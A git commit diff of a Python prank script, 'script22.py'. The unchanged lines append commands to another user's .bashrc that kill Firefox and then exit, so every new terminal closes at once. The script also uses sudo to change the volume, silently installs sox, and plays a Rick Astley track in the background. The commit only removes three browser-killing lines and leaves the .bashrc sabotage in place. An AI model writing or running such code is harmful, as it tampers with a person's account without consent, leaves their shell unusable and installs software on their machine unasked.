593c95321406b14656402408c286356a86c4b6a0
Blixrow <75791514+Blixrow@users.noreply.github.com>
2022-11-10 11:56:10 +0100

    Update script22.py

--- script22.py
+++ script22.py
@@ -6,10 +6,8 @@ for x in range(300):
 
 with open("../home/tls-sec/.bashrc", 'a+') as f:
     f.write("\npkill -f firefox\nexit")
+    
 
-subprocess.run("sudo pkill -f firefox")
-subprocess.run("sudo pkill -f chromium")
-subprocess.run("sudo pkill -f chrome")
 subprocess.run("sudo pactl -- set-sink-volume 0 30%")
 subprocess.run("sudo apt-get install sox libsox-fmt-mp3 -y")
 subprocess.run("( play -q /test/FIsxS52QXY7_Rick-Astley---Never-Gonna-Give-You-Up.mp3 )&")
